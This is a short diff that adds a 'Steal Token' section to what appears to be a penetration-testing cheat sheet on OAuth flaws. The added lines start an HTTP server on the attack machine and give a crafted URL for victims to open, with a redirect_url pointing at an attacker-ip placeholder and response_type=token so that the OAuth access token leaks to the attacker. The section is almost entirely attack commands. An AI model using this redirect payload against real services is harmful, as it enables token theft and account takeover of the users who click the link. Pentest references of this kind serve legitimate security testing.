@@ -22,6 +22,24 @@ POST /authenticate HTTP/1.1
 
 <br />
 
+## Steal Token
+
+```sh
+# On attack machine
+
+# Open http server
+python3 -m http.server 8000
+
+# -------------------------------------------------------
+
+# On web browser
+
+# Victims access to this
+https://vulnerable.com/oauth?redirect_url=http://<attacker-ip>:8000/login&response_type=token&scope=all
+```
+
+<br />
+
 ## Using CSRF attack
 
 ```html
